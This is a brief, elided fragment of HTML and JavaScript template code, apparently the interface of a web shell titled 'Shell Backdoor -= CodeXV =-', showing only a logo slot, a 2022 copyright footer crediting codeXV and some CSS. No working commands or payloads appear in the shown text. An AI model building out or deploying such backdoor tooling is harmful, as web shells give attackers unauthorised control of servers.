...
<img class="logo" src="`+getLogo()+`" alt="">
	...
	html += `
			...
			<hr>
			<center>copyright &copy; 2022 - <a style="color: yellow" href="https://www.instagram.com/codexv.group/">codeXV</a></center>
			<br>
    </div>
...
<head>
  ...
  <title>Shell Backdoor -= CodeXV =-</title>
  <style>
  .logo {
    width: 250px;
  }
